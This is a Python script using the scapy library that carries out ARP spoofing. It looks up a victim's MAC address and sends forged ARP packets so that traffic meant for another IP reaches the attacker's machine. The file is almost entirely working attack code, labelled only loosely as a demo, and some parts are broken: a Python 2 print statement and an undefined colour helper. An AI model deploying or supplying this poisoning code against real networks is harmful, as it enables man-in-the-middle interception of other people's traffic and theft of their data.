from scapy.all import *

#get MAC from ip
#for demo purposes, interface enp0s3 is used
def getmac(ip):
    packet = Ether() / ARP(op = ARP.who_has, pdst = ip)
    ans = srp1(packet, verbose = False, timeout = 10, iface = 'enp0s3')
    if ans[ARP] and ans[ARP].hwsrc:
        return ans[ARP].hwsrc
    else:
       return None

#get mac of host
#for demo purposes
#the enp0s3 interface is used
def gethostmac():
    macs = [get_if_hwaddr(i) for i in get_if_list()]
    for m in macs:
        if m != "00:00:00:00:00:00":
            hostmac = m
            break
    return hostmac
   
def arpspoof(macAttacker, macVictim, ipToSpoof, ipVictim):
    #create ARP packet
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim
    #send ARP packet to spoof
    sendp(arp, iface = 'enp0s3')
    
def arppoison(victimIP, ipToSpoof, attackerIP):
    victimMAC = getmac(victimIP)
    if victimMAC == None:
        print colores.ORANGE + 'Cannot find MAC address of victim\n' + colores.RED + 'End of program' + colores.RESETALL
        sys.exit()
    #for demo, suppose enp0s3 interface is used
    attackerMAC = gethostmac()
    arpspoof(attackerMAC, victimMAC, ipToSpoof, victimIP)
